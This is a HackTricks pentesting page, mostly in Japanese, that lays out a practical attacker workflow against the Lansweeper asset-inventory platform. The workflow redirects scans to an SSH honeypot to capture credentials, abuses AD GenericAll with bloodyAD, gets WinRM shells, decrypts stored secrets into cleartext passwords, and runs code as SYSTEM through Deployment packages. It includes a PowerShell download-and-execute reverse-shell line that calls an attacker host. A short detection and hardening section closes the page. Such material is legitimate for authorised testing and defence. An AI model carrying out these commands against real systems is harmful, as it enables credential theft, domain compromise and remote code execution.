# Lansweeper Abuse: Credential Harvesting、Secrets Decryption、Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper は、Windows 環境に導入され、Active Directory と統合されることが多い IT asset discovery および inventory platform です。Lansweeper に設定された credentials は、scanning engines が SSH、SMB/WMI、WinRM などの protocol 経由で assets に authenticate するために使用されます。Misconfiguration により、次のことが可能になる場合があります。

- scanning target を attacker-controlled host（honeypot）へ redirect することによる credential interception
- Lansweeper 関連グループによって公開された AD ACLs の abuse による remote access の取得
- Lansweeper に設定された secrets（connection strings および stored scanning credentials）の on-host decryption
- Deployment feature による managed endpoints 上での code execution（多くの場合 SYSTEM として実行）

このページでは、engagement 中にこれらの挙動を abuse するための実践的な attacker workflow と commands をまとめます。

## 1) honeypot による scanning credentials の harvest（SSH example）

Idea: 自分の host を指す Scanning Target を作成し、既存の Scanning Credentials を割り当てます。scan が実行されると、Lansweeper はそれらの credentials による authenticate を試み、honeypot がそれらを capture します。<sup>[[1]](#references)</sup>

手順の概要（web UI）:
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range（または Single IP）= 自分の VPN IP
- SSH port を到達可能な値に設定（例: 22 が block されている場合は 2022）
- schedule を disable し、手動で trigger する
- Scanning → Scanning Credentials → Linux/SSH creds が存在することを確認し、新しい target に map する（必要に応じてすべて enable）
- target で “Scan now” を click
- SSH honeypot を run し、試行された username/password を retrieve

sshesame を使用した example:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
取得した creds を DC のサービスに対して検証する：
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- 他のプロトコルでも、scannerを自分のlistenerへcoerceできる場合は同様に機能します（SMB/WinRM honeypotなど）。SSHが最も簡単なことが多いです。
- 多くのscannerは、固有のclient banner（例：RebexSSH）で自身を識別し、benignなコマンド（uname、whoamiなど）を実行しようとします。

## 2) AD ACL abuse：自分をapp-admin groupに追加してremote accessを取得する

BloodHoundを使用して、compromised accountから有効な権限を列挙します。よくある検出結果として、scannerまたはapp固有のgroup（例：「Lansweeper Discovery」）が、privileged group（例：「Lansweeper Admins」）に対してGenericAllを保持しているケースがあります。privileged groupが「Remote Management Users」のmemberでもある場合、自分自身を追加するとWinRMが利用可能になります。<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD (Linux) を使用して group の GenericAll を Exploitする:<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
次に、インタラクティブシェルを取得します：
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
ヒント: Kerberos の操作は時間に依存します。KRB_AP_ERR_SKEW が発生した場合は、まず DC と時刻を同期してください:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) ホスト上でLansweeper-configured secretsを復号する

Lansweeper serverでは、ASP.NET siteが通常、暗号化されたconnection stringと、applicationが使用するsymmetric keyを保存しています。適切なlocal accessがあれば、DB connection stringを復号し、保存されたscanning credentialsを抽出できます。<sup>[[1]](#references)</sup>

一般的な場所:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

SharpLansweeperDecryptを使用して、保存されたcredsの復号とdumpを自動化します。<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
想定される出力には、DB接続情報や、環境全体で使用されているWindowsおよびLinuxアカウントなどの平文のスキャン用認証情報が含まれます。これらは、ドメインホスト上で高いローカル権限を持っていることがよくあります:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
回収した Windows スキャン用認証情報を特権アクセスに使用する：
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins”のメンバーである場合、web UIからDeploymentとConfigurationが利用できます。Deployment → Deployment packagesでは、対象のasset上で任意のコマンドを実行するpackageを作成できます。実行は高い権限を持つLansweeper serviceによって行われるため、選択したhost上でNT AUTHORITY\SYSTEMとしてcode executionが可能です。<sup>[[1]](#references)</sup>

High-level steps:
- PowerShellまたはcmdのone-liner（reverse shell、add-userなど）を実行する新しいDeployment packageを作成します。
- 目的のasset（例：Lansweeperが実行されているDC/host）を対象にし、Deploy/Run nowをクリックします。
- SYSTEMとしてshellを取得します。

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. 慎重に使用する。

## Detection and hardening

- 匿名 SMB 列挙を制限または削除する。RID cycling と Lansweeper shares への異常なアクセスを監視する。
- Egress controls: scanner hosts からの outbound SSH/SMB/WinRM をブロックするか、厳格に制限する。非標準ポート（例: 2022）や、Rebex のような通常とは異なる client banners を検知する。
- `Website\\web.config` と `Key\\Encryption.txt` を保護する。secret は vault に外部化し、露出した場合は rotate する。最小権限の service accounts と、可能な場合は gMSA の使用を検討する。
- AD monitoring: Lansweeper 関連グループ（例: “Lansweeper Admins”、“Remote Management Users”）への変更、および privileged groups の membership に GenericAll/Write を付与する ACL changes を検知する。
- Deployment package の creations/changes/executions を audit する。cmd.exe/powershell.exe を spawn する package や、予期しない outbound connections を検知する。

## Related topics
- SMB/LSA/SAMR enumeration と RID cycling
- Kerberos password spraying と clock skew の考慮事項
- application-admin groups の BloodHound path analysis
- WinRM usage と lateral movement

## References
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
